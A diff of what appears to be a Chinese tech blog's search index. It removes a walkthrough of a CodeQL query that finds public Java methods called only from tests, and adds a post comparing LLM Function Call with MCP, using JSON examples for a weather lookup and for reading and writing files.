+<td>让模型与外部工具、服务、数据源通过统一协议进行双向通信。</td>
+</tr>
+<tr>
+<td><strong>角色</strong></td>
+<td>模型只“产生命令”（函数+参数），不执行。执行由外部应用完成。</td>
+<td>除生成调用外，还可以<strong>发现、注册、调度、执行</strong>外部资源。</td>
+</tr>
+<tr>
+<td><strong>复杂度</strong></td>
+<td>简单、轻量级、多数场景够用。</td>
+<td>更底层、更通用，可连接复杂系统。</td>
+</tr>
+<tr>
+<td><strong>使用场景</strong></td>
+<td>调用某个特定函数、处理结构化任务。</td>
+<td>接入多个工具、多数据源、插件系统、企业级工作流。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
 <span id="more"></span>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">bindingset[m]</span><br><span class="line">string fullSignature(Callable m) &#123;</span><br><span class="line">    if m instanceof Constructor</span><br><span class="line">    then</span><br><span class="line">        result = m.getName() + &quot;(&quot; + concat(int i | i = [0 .. m.getNumberOfParameters()] | m.getParameter(i).getType().getName() + &quot; &quot; + m.getParameter(i).getName(), &quot;, &quot;  order by i asc)  + &quot;)&quot;</span><br><span class="line">    else</span><br><span class="line">        result = m.getReturnType().getName() + &quot; &quot; + m.getName() + &quot;(&quot; + concat(int i | i = [0 .. m.getNumberOfParameters()] | m.getParameter(i).getType().getName() + &quot; &quot; + m.getParameter(i).getName(), &quot;, &quot;  order by i asc)  + &quot;)&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isTested(Callable m) &#123;</span><br><span class="line">    exists(Call c |</span><br><span class="line">        c.getCallee() = m and</span><br><span class="line">        c.getLocation().toString().indexOf(&quot;src/test&quot;) &gt;= 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isNotInvokedByInternalFunction(Callable m) &#123;</span><br><span class="line">    not exists(Call c |</span><br><span class="line">        c.getCallee() = m and</span><br><span class="line">        c.getLocation().toString().indexOf(&quot;src/test&quot;) &lt; 0</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bindingset[m]</span><br><span class="line">string paramTypes(Callable m) &#123;</span><br><span class="line">    result = concat(int i | i = [0 .. m.getNumberOfParameters()] | m.getParameter(i).getType().getName(), &quot;;&quot; order by i asc)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bindingset[m]</span><br><span class="line">string getJavadocString(Callable m) &#123;</span><br><span class="line">    if (exists(Javadoc d | m.getDoc().getJavadoc() = d))</span><br><span class="line">    then</span><br><span class="line">        result = concat(int i | i = [0 .. m.getDoc().getJavadoc().getNumChild()] | m.getDoc().getJavadoc().getChild(i).getText(), &quot; &quot; order by i asc)</span><br><span class="line">    else</span><br><span class="line">        result = &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">    Callable method</span><br><span class="line">where</span><br><span class="line">    method.fromSource() and</span><br><span class="line">    method.isPublic() and</span><br><span class="line">    not method.hasNoParameters() and</span><br><span class="line">    isTested(method) and</span><br><span class="line">    isNotInvokedByInternalFunction(method)</span><br><span class="line">select</span><br><span class="line">    method.getDeclaringType().getSourceDeclaration().getPackage() as package,</span><br><span class="line">    method.getDeclaringType().getSourceDeclaration() as clazz,</span><br><span class="line">    method.getName() as func,</span><br><span class="line">    fullSignature(method) as full_signature,</span><br><span class="line">    method.getStringSignature() as internal_signature,</span><br><span class="line">    method.getLocation().toString() as location,</span><br><span class="line">    paramTypes(method) as parameter_types,</span><br><span class="line">    method.getReturnType().getName() as return_type,</span><br><span class="line">    getJavadocString(method) as doc</span><br></pre></td></tr></table></figure>
-<h2 id="2）fullSignature-Callable-m-：拼一个“人类可读签名”"><a href="#2）fullSignature-Callable-m-：拼一个“人类可读签名”" class="headerlink" title="2）fullSignature(Callable m)：拼一个“人类可读签名”"></a>2）<code>fullSignature(Callable m)</code>：拼一个“人类可读签名”</h2><p>你这段和上一条差不多，只是单独拿来复用。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bindingset[m]</span><br><span class="line">string fullSignature(Callable m) &#123;</span><br><span class="line">  if m instanceof Constructor</span><br><span class="line">  then</span><br><span class="line">    result = m.getName() + &quot;(&quot; + concat(...参数列表...) + &quot;)&quot;</span><br><span class="line">  else</span><br><span class="line">    result = m.getReturnType().getName() + &quot; &quot; + m.getName() + &quot;(&quot; + concat(...参数列表...) + &quot;)&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="关键点-A：Constructor-vs-普通方法"><a href="#关键点-A：Constructor-vs-普通方法" class="headerlink" title="关键点 A：Constructor vs 普通方法"></a>关键点 A：Constructor vs 普通方法</h3><ul>
-<li>构造函数没有返回值，所以输出 <code>ClassName(...)</code></li>
-<li>普通方法输出 <code>ReturnType methodName(...)</code></li>
-</ul>
-<h3 id="关键点-B：concat-遍历参数"><a href="#关键点-B：concat-遍历参数" class="headerlink" title="关键点 B：concat 遍历参数"></a>关键点 B：concat 遍历参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(int i |</span><br><span class="line">  i = [0 .. m.getNumberOfParameters()] |</span><br><span class="line">  m.getParameter(i).getType().getName() + &quot; &quot; + m.getParameter(i).getName(),</span><br><span class="line">  &quot;, &quot; order by i asc)</span><br></pre></td></tr></table></figure>
-<p>它的意图是按参数顺序拼成：<br><code>int a, java.lang.String b</code></p>
-<p>⚠️ <strong>潜在坑：索引范围</strong></p>
-<ul>
-<li><code>m.getNumberOfParameters()</code> 返回参数个数，比如 2</li>
-<li>参数下标通常是 <code>0</code> 和 <code>1</code></li>
-<li>但你用了 <code>[0 .. m.getNumberOfParameters()]</code>（包含上界的话会多取一次）</li>
-</ul>
-<p>在很多 CodeQL 示例里会用：</p>
-<ul>
-<li><code>[0 .. m.getNumberOfParameters()-1]</code></li>
-<li>或者用 <code>Parameter p | p = m.getAParameter()</code> 这种更安全的写法</li>
-</ul>
-<p>如果你跑起来没报错，可能是 CodeQL 的区间语义/实现把最后一个排除了，但<strong>从阅读角度这段写法很容易“越界风险”</strong>，建议改成更明确的写法。</p>
-<h2 id="3）isTested-Callable-m-：在测试目录出现过调用"><a href="#3）isTested-Callable-m-：在测试目录出现过调用" class="headerlink" title="3）isTested(Callable m)：在测试目录出现过调用"></a>3）<code>isTested(Callable m)</code>：在测试目录出现过调用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">predicate isTested(Callable m) &#123;</span><br><span class="line">  exists(Call c |</span><br><span class="line">    c.getCallee() = m and</span><br><span class="line">    c.getLocation().toString().indexOf(&quot;src/test&quot;) &gt;= 0</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="它在做什么？"><a href="#它在做什么？" class="headerlink" title="它在做什么？"></a>它在做什么？</h3><ul>
-<li>遍历所有调用 <code>Call c</code></li>
-<li>找到被调用目标是 <code>m</code> 的调用点</li>
-<li>并且调用点的位置字符串里包含 <code>&quot;src/test&quot;</code></li>
-</ul>
-<p>✅ 这就是：<strong>至少有一次调用发生在 src/test 目录中</strong></p>
-<h3 id="⚠️-这条判断“测试代码”的方式比较粗糙"><a href="#⚠️-这条判断“测试代码”的方式比较粗糙" class="headerlink" title="⚠️ 这条判断“测试代码”的方式比较粗糙"></a>⚠️ 这条判断“测试代码”的方式比较粗糙</h3><ul>
-<li>Maven/Gradle 常见测试路径：<code>src/test/java</code></li>
-<li>但也可能是：<code>src/test/kotlin</code>、<code>src/integrationTest</code>、<code>test/</code>、<code>src/it</code> 等</li>
-<li>甚至 Windows 路径分隔符等问题（不过 <code>toString()</code> 一般会统一）</li>
-</ul>
-<p>更稳妥方式是用 CodeQL 自带的测试/文件夹抽象（如果有），或者用正则匹配更完整路径。</p>
-<h2 id="4）isNotInvokedByInternalFunction-Callable-m-：业务代码里从未调用过"><a href="#4）isNotInvokedByInternalFunction-Callable-m-：业务代码里从未调用过" class="headerlink" title="4）isNotInvokedByInternalFunction(Callable m)：业务代码里从未调用过"></a>4）<code>isNotInvokedByInternalFunction(Callable m)</code>：业务代码里从未调用过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">predicate isNotInvokedByInternalFunction(Callable m) &#123;</span><br><span class="line">  not exists(Call c |</span><br><span class="line">    c.getCallee() = m and</span><br><span class="line">    c.getLocation().toString().indexOf(&quot;src/test&quot;) &lt; 0</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="翻译成人话"><a href="#翻译成人话" class="headerlink" title="翻译成人话"></a>翻译成人话</h3><p>不存在这样的调用 <code>c</code>：</p>
-<ul>
-<li>调用了 <code>m</code></li>
-<li>并且调用位置 <strong>不在</strong> <code>src/test</code>（因为 indexOf &lt; 0 表示没找到）</li>
-</ul>
-<p>等价于：</p>
+<h2 id="🧠Function-Call-是什么？"><a href="#🧠Function-Call-是什么？" class="headerlink" title="🧠Function Call 是什么？"></a>🧠Function Call 是什么？</h2><p><strong>Function Call</strong> 是模型输出的一种结构化格式，模型输出它想调用什么函数并且要传什么参数。模型只负责<strong>输出结构化 JSON</strong>，实际执行由相关程序完成。</p>
+<p><strong>Function Call</strong>提供的是 API 层的能力，由开发者定义可调用函数列表，模型产出：函数名 + 参数，适用于简单逻辑。</p>
+<h3 id="✔-Function-Call-示例"><a href="#✔-Function-Call-示例" class="headerlink" title="✔ Function Call 示例"></a>✔ Function Call 示例</h3><p>假设开发者定义了一个函数：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;get_weather&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;获取城市天气&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;city&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>用户问：</p>
 <blockquote>
-<p><strong>m 的所有调用点都在测试目录中</strong>（或者根本没人调用）</p>
+<p>“明天北京天气如何？”</p>
 </blockquote>
-<p>但注意：你在 where 里又加了 <code>isTested(method)</code>，所以确保至少在测试里被调用一次。<br>因此最终效果是：</p>
+<p>模型可能返回：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;get_weather&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;北京&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>然后 <strong>相关程序</strong> 执行 get_weather(“北京”) 并把结果再返回给模型或用户。</p>
+<p>📌 <strong>关键点：模型不会执行，只会返回结构体。</strong></p>
+<h2 id="🧠MCP（Model-Context-Protocol）是什么？"><a href="#🧠MCP（Model-Context-Protocol）是什么？" class="headerlink" title="🧠MCP（Model Context Protocol）是什么？"></a>🧠MCP（Model Context Protocol）是什么？</h2><p>MCP 是一个<strong>通用协议</strong>，用于管理工具（tools），连接外部数据源（database、文件系统等），让模型能够发现并调用这些资源，同时统一不同工具的接口格式。</p>
+<p>可以把 MCP 理解为：</p>
 <blockquote>
-<p><strong>只被测试调用过（至少一次），从不被业务代码调用。</strong></p>
+<p><strong>模型与外部世界的“操作系统抽象层”</strong><br>它让模型能直接访问文件、数据库、网络等工具。</p>
 </blockquote>
-<h3 id="⚠️-命名有点误导"><a href="#⚠️-命名有点误导" class="headerlink" title="⚠️ 命名有点误导"></a>⚠️ 命名有点误导</h3><p><code>isNotInvokedByInternalFunction</code> 其实检查的是“非 test 的任何调用”。<br>并不一定是“internal function”（内部函数）调用，也可能是 main、工具脚本、样例代码等。<br>更贴切的名字可能是 <code>hasNoNonTestCallSites</code>。</p>
-<h2 id="5）paramTypes-Callable-m-：只拼参数类型"><a href="#5）paramTypes-Callable-m-：只拼参数类型" class="headerlink" title="5）paramTypes(Callable m)：只拼参数类型"></a>5）<code>paramTypes(Callable m)</code>：只拼参数类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = concat(int i | i = [0 .. m.getNumberOfParameters()] |</span><br><span class="line">  m.getParameter(i).getType().getName(), &quot;;&quot; order by i asc)</span><br></pre></td></tr></table></figure>
-<p>输出像：<br><code>int;java.lang.String;boolean</code></p>
-<p>用途通常是：</p>
+<p>它的“能力”比 Function Call 强得多，因为：</p>
+<p>👉 <strong>Function Call 只能调用开发人员手工写死的函数</strong><br>👉 <strong>MCP 可以动态加载工具包、文件系统服务、环境服务，让模型像操作系统用户一样访问资源</strong></p>
+<hr>
+<h3 id="✔-MCP-示例"><a href="#✔-MCP-示例" class="headerlink" title="✔ MCP 示例"></a>✔ MCP 示例</h3><p>假设 MCP 提供一个工具 <code>fs.read_file</code>。</p>
+<p>用户问：</p>
+<blockquote>
+<p>“打开 /docs/intro.md 读给我听”</p>
+</blockquote>
+<p>模型实际会产生这样的消息（非 Function Call 风格，而是 MCP 消息协议）：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;call_tool&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tool&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fs.read_file&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/docs/intro.md&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>服务端会执行 <strong>read_file</strong> 并返回文件内容。</p>
+<p>模型可以继续请求：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;call_tool&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tool&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fs.write_file&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/docs/notes.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;这里是我总结的内容...&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这里体现 MCP 的本质：</p>
 <ul>
-<li>比 <code>getStringSignature()</code> 更可控</li>
-<li>用于后处理（CSV 分析）做“方法重载区分”</li>
+<li>模型知道有哪些工具可用</li>
+<li>模型直接“操控”这些工具</li>
+<li>具有类似“文件读写”等复杂能力</li>
+<li>不需要开发者提前硬编码所有函数</li>
 </ul>
-<p>同样有上面提到的索引区间潜在坑。</p>
-<h2 id="6）getJavadocString-Callable-m-：把-JavaDoc-扁平化成字符串"><a href="#6）getJavadocString-Callable-m-：把-JavaDoc-扁平化成字符串" class="headerlink" title="6）getJavadocString(Callable m)：把 JavaDoc 扁平化成字符串"></a>6）<code>getJavadocString(Callable m)</code>：把 JavaDoc 扁平化成字符串</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (exists(Javadoc d | m.getDoc().getJavadoc() = d))</span><br><span class="line">then result = concat(...child text...)</span><br><span class="line">else result = &quot;&quot;</span><br></pre></td></tr></table></figure>
-<p>这个函数最终让你的输出列里有 doc 文本，方便：</p>
-<ul>
-<li>生成报告</li>
-<li>过滤“有没有说明文档”</li>
-<li>做 NLP/检索（比如把这些 API 建索引）</li>
-</ul>
-<h2 id="7）主查询：from-where-的组合含义"><a href="#7）主查询：from-where-的组合含义" class="headerlink" title="7）主查询：from / where 的组合含义"></a>7）主查询：from / where 的组合含义</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Callable method</span><br><span class="line">where</span><br><span class="line">  method.fromSource() and</span><br><span class="line">  method.isPublic() and</span><br><span class="line">  not method.hasNoParameters() and</span><br><span class="line">  isTested(method) and</span><br><span class="line">  isNotInvokedByInternalFunction(method)</span><br><span class="line">select ...</span><br></pre></td></tr></table></figure>
-<p>逐个解释：</p>
-<h3 id="✅-method-fromSource"><a href="#✅-method-fromSource" class="headerlink" title="✅ method.fromSource()"></a>✅ <code>method.fromSource()</code></h3><p>只选项目源码里的方法（排除库/依赖里解析出来的方法）</p>
-<h3 id="✅-method-isPublic"><a href="#✅-method-isPublic" class="headerlink" title="✅ method.isPublic()"></a>✅ <code>method.isPublic()</code></h3><p>只关心 public 方法<br>→ 这意味着你在找“对外暴露的 API”，但其实只被测试用。</p>
-<h3 id="✅-not-method-hasNoParameters"><a href="#✅-not-method-hasNoParameters" class="headerlink" title="✅ not method.hasNoParameters()"></a>✅ <code>not method.hasNoParameters()</code></h3><p>只关心<strong>有参数的方法</strong><br>（可能你想排除 getter / toString 这种零参方法，让结果更有价值）</p>
-<h3 id="✅-isTested-method"><a href="#✅-isTested-method" class="headerlink" title="✅ isTested(method)"></a>✅ <code>isTested(method)</code></h3><p>必须在 <code>src/test</code> 至少出现一次调用</p>
-<h3 id="✅-isNotInvokedByInternalFunction-method"><a href="#✅-isNotInvokedByInternalFunction-method" class="headerlink" title="✅ isNotInvokedByInternalFunction(method)"></a>✅ <code>isNotInvokedByInternalFunction(method)</code></h3><p>必须在非 test 路径中 <strong>没有任何调用</strong></p>
-<h2 id="8）select-输出：你最终想拿到什么信息？"><a href="#8）select-输出：你最终想拿到什么信息？" class="headerlink" title="8）select 输出：你最终想拿到什么信息？"></a>8）select 输出：你最终想拿到什么信息？</h2><p>你输出的是一张“方法清单”表：</p>
-<ul>
-<li>package</li>
-<li>clazz</li>
-<li>func（方法名）</li>
-<li>full_signature（人类可读签名）</li>
-<li>internal_signature（CodeQL 的签名字符串，更偏机器）</li>
-<li>location（方法声明位置）</li>
-<li>parameter_types（类型列表）</li>
-<li>return_type</li>
-<li>doc（Javadoc）</li>
-</ul>
-<p>👉 这是典型的“导出 CSV / 报告”的结构。</p>
-<h2 id="9）这条规则的典型用途（为什么有意义？）"><a href="#9）这条规则的典型用途（为什么有意义？）" class="headerlink" title="9）这条规则的典型用途（为什么有意义？）"></a>9）这条规则的典型用途（为什么有意义？）</h2><p>它可以用于发现：</p>
-<h3 id="A-只为测试写的-public-API（过度暴露）"><a href="#A-只为测试写的-public-API（过度暴露）" class="headerlink" title="A. 只为测试写的 public API（过度暴露）"></a>A. 只为测试写的 public API（过度暴露）</h3><p>如果一个 public 方法只被测试调用，那它可能本不该是 public。</p>
-<h3 id="B-“死-API”"><a href="#B-“死-API”" class="headerlink" title="B. “死 API”"></a>B. “死 API”</h3><p>对业务没有任何调用，但测试仍在测它——可能是旧功能遗留。</p>
-<h3 id="C-测试策略问题"><a href="#C-测试策略问题" class="headerlink" title="C. 测试策略问题"></a>C. 测试策略问题</h3><p>测试直接调用内部方法，而不是通过更高层接口测试行为。</p>
-<h2 id="10）重要的坑与改进建议（很实用）"><a href="#10）重要的坑与改进建议（很实用）" class="headerlink" title="10）重要的坑与改进建议（很实用）"></a>10）重要的坑与改进建议（很实用）</h2><h3 id="改进-1：测试路径判断更稳"><a href="#改进-1：测试路径判断更稳" class="headerlink" title="改进 1：测试路径判断更稳"></a>改进 1：测试路径判断更稳</h3><p>当前用 <code>&quot;src/test&quot;</code> 字符串包含判断，建议更精确：</p>
-<ul>
-<li>匹配 <code>src/test/java</code>、<code>src/test/kotlin</code></li>
-<li>或额外覆盖 <code>src/integrationTest</code> 等</li>
-</ul>
-<h3 id="改进-2：区分“被测试调用”-vs-“测试类反射-框架调用”"><a href="#改进-2：区分“被测试调用”-vs-“测试类反射-框架调用”" class="headerlink" title="改进 2：区分“被测试调用” vs “测试类反射/框架调用”"></a>改进 2：区分“被测试调用” vs “测试类反射/框架调用”</h3><p>如果测试是通过反射、参数化框架、Spring 容器间接触发，有时 <code>Call</code> 不会出现显式调用点。结果会漏。</p>
-<h3 id="改进-3：排除构造函数-重载-接口方法等"><a href="#改进-3：排除构造函数-重载-接口方法等" class="headerlink" title="改进 3：排除构造函数/重载/接口方法等"></a>改进 3：排除构造函数/重载/接口方法等</h3><p>你现在是 <code>Callable</code>，包含：</p>
-<ul>
-<li>方法</li>
-<li>构造器</li>
-<li>可能还包括一些特殊 callable</li>
-</ul>
-<p>如果你的目标是“public 方法”，更常用 <code>Method</code> 类型：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Method method</span><br></pre></td></tr></table></figure>
-<h3 id="改进-4：把-“业务代码里没人调用”-限定为-fromSource"><a href="#改进-4：把-“业务代码里没人调用”-限定为-fromSource" class="headerlink" title="改进 4：把 “业务代码里没人调用” 限定为 fromSource"></a>改进 4：把 “业务代码里没人调用” 限定为 fromSource</h3><p>现在 <code>isNotInvokedByInternalFunction</code> 只看 location 字符串。<br>更稳的是限定调用点来源文件也是 source。</p>
+<h2 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>Function Call</th>
+<th>MCP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>工具发现</td>
+<td>手工定义</td>
+<td>自动注册，模型可自动学习工具能力</td>
+</tr>
+<tr>
+<td>调用方式</td>
+<td>结构化 JSON</td>
+<td>双向协议、消息通信</td>
+</tr>
+<tr>
+<td>扩展性</td>
+<td>每加一个功能都要新增函数定义</td>
+<td>新增 MCP 服务即可扩展工具能力</td>
+</tr>
+<tr>
+<td>模型能力</td>
+<td>被动</td>
+<td>主动、可规划调用流程</td>
+</tr>
+<tr>
+<td>场景</td>
+<td>简单 API 调用、数据结构化</td>
+<td>IDE、数据库集成、文件系统、GitHub 操作、企业自动化</td>
+</tr>
+</tbody>
+</table>
+</div>
 ]]></content>
       <categories>
-        <category>SAST</category>
+        <category>MCP</category>
       </categories>
       <tags>
-        <tag>CodeQL</tag>
-        <tag>SAST</tag>
+        <tag>MCP</tag>
       </tags>
   </entry>
   <entry>
@@ -841,127 +962,6 @@
       <tags>
         <tag>CodeQL</tag>
         <tag>SAST</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Function Call和MCP的区别</title>
-    <url>/2025/12/11/Function-Call%E5%92%8CMCP%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
-    <content><![CDATA[<h2 id="Function-Call和MCP的核心区别梳理（由GPT-5-1-生成）"><a href="#Function-Call和MCP的核心区别梳理（由GPT-5-1-生成）" class="headerlink" title="Function Call和MCP的核心区别梳理（由GPT 5.1 生成）"></a>Function Call和MCP的核心区别梳理（由GPT 5.1 生成）</h2><h2 id="🧩核心区别总结"><a href="#🧩核心区别总结" class="headerlink" title="🧩核心区别总结"></a>🧩核心区别总结</h2><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>特性</th>
-<th>Function Call</th>
-<th>MCP（Model Context Protocol）</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>定位</strong></td>
-<td>让模型按照开发者定义的结构化方式返回“调用某函数所需的参数”。</td>
-<td>让模型与外部工具、服务、数据源通过统一协议进行双向通信。</td>
-</tr>
-<tr>
-<td><strong>角色</strong></td>
-<td>模型只“产生命令”（函数+参数），不执行。执行由外部应用完成。</td>
-<td>除生成调用外，还可以<strong>发现、注册、调度、执行</strong>外部资源。</td>
-</tr>
-<tr>
-<td><strong>复杂度</strong></td>
-<td>简单、轻量级、多数场景够用。</td>
-<td>更底层、更通用，可连接复杂系统。</td>
-</tr>
-<tr>
-<td><strong>使用场景</strong></td>
-<td>调用某个特定函数、处理结构化任务。</td>
-<td>接入多个工具、多数据源、插件系统、企业级工作流。</td>
-</tr>
-</tbody>
-</table>
-</div>
-<hr>
-<span id="more"></span>
-<h2 id="🧠Function-Call-是什么？"><a href="#🧠Function-Call-是什么？" class="headerlink" title="🧠Function Call 是什么？"></a>🧠Function Call 是什么？</h2><p><strong>Function Call</strong> 是模型输出的一种结构化格式，模型输出它想调用什么函数并且要传什么参数。模型只负责<strong>输出结构化 JSON</strong>，实际执行由相关程序完成。</p>
-<p><strong>Function Call</strong>提供的是 API 层的能力，由开发者定义可调用函数列表，模型产出：函数名 + 参数，适用于简单逻辑。</p>
-<h3 id="✔-Function-Call-示例"><a href="#✔-Function-Call-示例" class="headerlink" title="✔ Function Call 示例"></a>✔ Function Call 示例</h3><p>假设开发者定义了一个函数：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;get_weather&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;获取城市天气&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;required&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;city&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>用户问：</p>
-<blockquote>
-<p>“明天北京天气如何？”</p>
-</blockquote>
-<p>模型可能返回：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;get_weather&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;北京&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>然后 <strong>相关程序</strong> 执行 get_weather(“北京”) 并把结果再返回给模型或用户。</p>
-<p>📌 <strong>关键点：模型不会执行，只会返回结构体。</strong></p>
-<h2 id="🧠MCP（Model-Context-Protocol）是什么？"><a href="#🧠MCP（Model-Context-Protocol）是什么？" class="headerlink" title="🧠MCP（Model Context Protocol）是什么？"></a>🧠MCP（Model Context Protocol）是什么？</h2><p>MCP 是一个<strong>通用协议</strong>，用于管理工具（tools），连接外部数据源（database、文件系统等），让模型能够发现并调用这些资源，同时统一不同工具的接口格式。</p>
-<p>可以把 MCP 理解为：</p>
-<blockquote>
-<p><strong>模型与外部世界的“操作系统抽象层”</strong><br>它让模型能直接访问文件、数据库、网络等工具。</p>
-</blockquote>
-<p>它的“能力”比 Function Call 强得多，因为：</p>
-<p>👉 <strong>Function Call 只能调用开发人员手工写死的函数</strong><br>👉 <strong>MCP 可以动态加载工具包、文件系统服务、环境服务，让模型像操作系统用户一样访问资源</strong></p>
-<hr>
-<h3 id="✔-MCP-示例"><a href="#✔-MCP-示例" class="headerlink" title="✔ MCP 示例"></a>✔ MCP 示例</h3><p>假设 MCP 提供一个工具 <code>fs.read_file</code>。</p>
-<p>用户问：</p>
-<blockquote>
-<p>“打开 /docs/intro.md 读给我听”</p>
-</blockquote>
-<p>模型实际会产生这样的消息（非 Function Call 风格，而是 MCP 消息协议）：</p>
